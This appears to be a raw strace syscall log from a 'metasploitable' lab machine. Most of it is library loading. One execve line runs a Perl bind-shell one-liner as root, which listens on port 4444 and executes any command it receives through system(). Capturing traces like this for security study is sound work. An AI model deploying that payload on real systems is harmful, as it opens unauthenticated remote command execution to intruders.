B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
10888 07:35:08.606503 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
10888 07:35:08.606520 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d6d000
10888 07:35:08.606531 mmap2(0xb7d75000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7d75000
10888 07:35:08.606547 close(1)          = 0
10888 07:35:08.606560 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10888 07:35:08.606600 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
10888 07:35:08.606617 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
10888 07:35:08.606707 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
10888 07:35:08.606724 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d62000
10888 07:35:08.606736 mmap2(0xb7d6b000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d6b000
10888 07:35:08.606752 close(1)          = 0
10888 07:35:08.606774 munmap(0xb7f1d000, 29913) = 0
10888 07:35:08.606790 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
10888 07:35:08.606805 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
10888 07:35:08.606816 _llseek(1, 0, [0], SEEK_CUR) = 0
10888 07:35:08.606828 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
10888 07:35:08.606845 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f24000
10888 07:35:08.606855 _llseek(1, 1624, [1624], SEEK_SET) = 0
10888 07:35:08.606870 munmap(0xb7f24000, 1624) = 0
10888 07:35:08.606880 close(1)          = 0
10888 07:35:08.606909 getpgrp()         = 3831
10888 07:35:08.606919 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
10888 07:35:08.606934 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
10888 07:35:08.606950 brk(0x8101000)    = 0x8101000
10888 07:35:08.606981 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10888 07:35:08.606999 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10888 07:35:08.607014 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10888 07:35:08.607054 brk(0x8102000)    = 0x8102000
10888 07:35:08.607091 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
10888 07:35:08.607154 stat64("/sbin/AB", 0xbf9c7018) = -1 ENOENT (No such file or directory)
10888 07:35:08.607167 stat64("/bin/AB", 0xbf9c7018) = -1 ENOENT (No such file or directory)
10888 07:35:08.607178 stat64("/usr/sbin/AB", 0xbf9c7018) = -1 ENOENT (No such file or directory)
10888 07:35:08.607190 stat64("/usr/bin/AB", 0xbf9c7018) = -1 ENOENT (No such file or directory)
10888 07:35:08.607203 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
10888 07:35:08.607218 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d986f8) = 10889
10889 07:35:08.607265 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10889 07:35:08.607281 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
10889 07:35:08.607294 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
10889 07:35:08.607306 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
10889 07:35:08.607322 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
10889 07:35:08.607337 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
10889 07:35:08.607350 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
10889 07:35:08.607405 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
10889 07:35:08.607419 --- SIGPIPE (Broken pipe) @ 0 (0) ---
10889 07:35:08.607482 exit_group(127)   = ?
4519  07:35:08.614037 waitpid(10888,  <unfinished ...>
10888 07:35:08.614065 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10888 07:35:08.623994 --- SIGCHLD (Child exited) @ 0 (0) ---
10888 07:35:08.624010 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 10889
10888 07:35:08.624028 waitpid(-1, 0xbf9c6c98, WNOHANG) = -1 ECHILD (No child processes)
10888 07:35:08.624039 sigreturn()       = ? (mask now [])
10888 07:35:08.624062 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
10888 07:35:08.624076 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10888 07:35:08.624087 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
10888 07:35:08.624100 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
10888 07:35:08.624118 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10888 07:35:08.624129 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
10888 07:35:08.624164 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
10888 07:35:08.624185 stat64("/sbin/perl", 0xbf9c7048) = -1 ENOENT (No such file or directory)
10888 07:35:08.624197 stat64("/bin/perl", 0xbf9c7048) = -1 ENOENT (No such file or directory)
10888 07:35:08.624208 stat64("/usr/sbin/perl", 0xbf9c7048) = -1 ENOENT (No such file or directory)
10888 07:35:08.624220 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
10888 07:35:08.624238 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
10888 07:35:08.624264 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
10888 07:35:08.624278 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d986f8) = 10890
10890 07:35:08.634001 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10890 07:35:08.634023 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
10890 07:35:08.634036 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
10890 07:35:08.634049 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
10890 07:35:08.634064 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
10890 07:35:08.634079 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
10890 07:35:08.634092 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
10890 07:35:08.634128 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
10890 07:35:08.634221 brk(0)            = 0x8153000
10890 07:35:08.634248 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10890 07:35:08.634264 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd4000
10890 07:35:08.634280 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
10890 07:35:08.634297 open("/etc/ld.so.cache", O_RDONLY) = 1
10890 07:35:08.634310 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10890 07:35:08.634327 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fcc000
10890 07:35:08.634337 close(1)          = 0
10890 07:35:08.634348 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10890 07:35:08.634363 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
10890 07:35:08.634378 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
10890 07:35:08.634480 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
10890 07:35:08.634499 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7fc8000
10890 07:35:08.634511 mmap2(0xb7fca000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7fca000
10890 07:35:08.634528 close(1)          = 0
10890 07:35:08.634539 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10890 07:35:08.634553 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
10890 07:35:08.634567 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
10890 07:35:08.634656 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
10890 07:35:08.634673 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7fa3000
10890 07:35:08.634684 mmap2(0xb7fc6000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7fc6000
10890 07:35:08.634702 close(1)          = 0
10890 07:35:08.634714 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10890 07:35:08.634728 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
10890 07:35:08.634747 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
10890 07:35:08.634834 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
10890 07:35:08.634850 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fa2000
10890 07:35:08.634863 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f8a000
10890 07:35:08.634874 mmap2(0xb7f9e000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7f9e000
10890 07:35:08.634889 mmap2(0xb7fa0000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fa0000
10890 07:35:08.634902 close(1)          = 0
10890 07:35:08.634914 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10890 07:35:08.634927 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
10890 07:35:08.634949 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
10890 07:35:08.635039 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
10890 07:35:08.635056 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e3b000
10890 07:35:08.635068 mmap2(0xb7f84000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f84000
10890 07:35:08.635083 mmap2(0xb7f87000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f87000
10890 07:35:08.635096 close(1)          = 0
10890 07:35:08.635108 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10890 07:35:08.635121 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
10890 07:35:08.635135 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
10890 07:35:08.635230 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
10890 07:35:08.635248 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e09000
10890 07:35:08.635259 mmap2(0xb7e12000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7e12000
10890 07:35:08.635273 mmap2(0xb7e14000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7e14000
10890 07:35:08.635287 close(1)          = 0
10890 07:35:08.635311 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e08000
10890 07:35:08.635324 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e088c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
10890 07:35:08.635384 mprotect(0xb7f84000, 4096, PROT_READ) = 0
10890 07:35:08.635411 munmap(0xb7fcc000, 29913) = 0
10890 07:35:08.635424 set_tid_address(0xb7e08908) = 10890
10890 07:35:08.635441 set_robust_list(0xb7e08910, 0xc) = 0
10890 07:35:08.635451 futex(0xbfbc1060, 0x81 /* FUTEX_??? */, 1) = 0
10890 07:35:08.635466 rt_sigaction(SIGRTMIN, {0xb7f8e2c0, [], SA_SIGINFO}, NULL, 8) = 0
10890 07:35:08.635479 rt_sigaction(SIGRT_1, {0xb7f8e340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
10890 07:35:08.635492 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
10890 07:35:08.635505 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
10890 07:35:08.635525 uname({sys="Linux", node="metasploitable", ...}) = 0
10890 07:35:08.635571 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
10890 07:35:08.635617 brk(0)            = 0x8153000
10890 07:35:08.635627 brk(0x8174000)    = 0x8174000
10890 07:35:08.635671 getuid32()        = 0
10890 07:35:08.635682 geteuid32()       = 0
10890 07:35:08.635691 getgid32()        = 0
10890 07:35:08.635700 getegid32()       = 0
10890 07:35:08.635737 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7de7000
10890 07:35:08.635763 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
10890 07:35:08.635780 read(1, " 0W-", 4) = 4
10890 07:35:08.635793 close(1)          = 0
10890 07:35:08.635811 time(NULL)        = 1495625708
10890 07:35:08.635852 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbfbc0d30) = -1 ENOENT (No such file or directory)
10890 07:35:08.635870 stat64("/usr/local/lib/site_perl/5.8.8", 0xbfbc0d30) = -1 ENOENT (No such file or directory)
10890 07:35:08.635883 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbfbc0d30) = -1 ENOENT (No such file or directory)
10890 07:35:08.635898 stat64("/usr/local/lib/perl/5.8.7", 0xbfbc0e70) = -1 ENOENT (No such file or directory)
10890 07:35:08.635911 stat64("/usr/local/share/perl/5.8.7", 0xbfbc0e70) = -1 ENOENT (No such file or directory)
10890 07:35:08.635923 stat64("/usr/local/lib/perl/5.8.6", 0xbfbc0e70) = -1 ENOENT (No such file or directory)
10890 07:35:08.635934 stat64("/usr/local/share/perl/5.8.6", 0xbfbc0e70) = -1 ENOENT (No such file or directory)
10890 07:35:08.635946 stat64("/usr/local/lib/perl/5.8.4", 0xbfbc0e70) = -1 ENOENT (No such file or directory)
10890 07:35:08.635965 stat64("/usr/local/share/perl/5.8.4", 0xbfbc0e70) = -1 ENOENT (No such file or directory)
10890 07:35:08.635978 stat64("/usr/local/lib/perl/5.8.3", 0xbfbc0e70) = -1 ENOENT (No such file or directory)
10890 07:35:08.635994 stat64("/usr/local/share/perl/5.8.3", 0xbfbc0e70) = -1 ENOENT (No such file or directory)
10890 07:35:08.636006 stat64("/usr/local/lib/perl/5.8.2", 0xbfbc0e70) = -1 ENOENT (No such file or directory)
10890 07:35:08.636017 stat64("/usr/local/share/perl/5.8.2", 0xbfbc0e70) = -1 ENOENT (No such file or directory)
10890 07:35:08.636029 stat64("/usr/local/lib/perl/5.8.1", 0xbfbc0e70) = -1 ENOENT (No such file or directory)
10890 07:35:08.636041 stat64("/usr/local/share/perl/5.8.1", 0xbfbc0e70) = -1 ENOENT (No such file or directory)
10890 07:35:08.636052 stat64("/usr/local/lib/perl/5.8.0", 0xbfbc0e70) = -1 ENOENT (No such file or directory)
10890 07:35:08.636064 stat64("/usr/local/share/perl/5.8.0", 0xbfbc0e70) = -1 ENOENT (No such file or directory)
10890 07:35:08.636087 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0b68) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.636100 _llseek(0, 0, [0], SEEK_CUR) = 0
10890 07:35:08.636113 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0b68) = -1 EBADF (Bad file descriptor)
10890 07:35:08.636123 _llseek(1, 0, 0xbfbc0bb0, SEEK_CUR) = -1 EBADF (Bad file descriptor)
10890 07:35:08.636134 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0b68) = -1 EINVAL (Invalid argument)
10890 07:35:08.636145 _llseek(2, 0, 0xbfbc0bb0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10890 07:35:08.636155 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
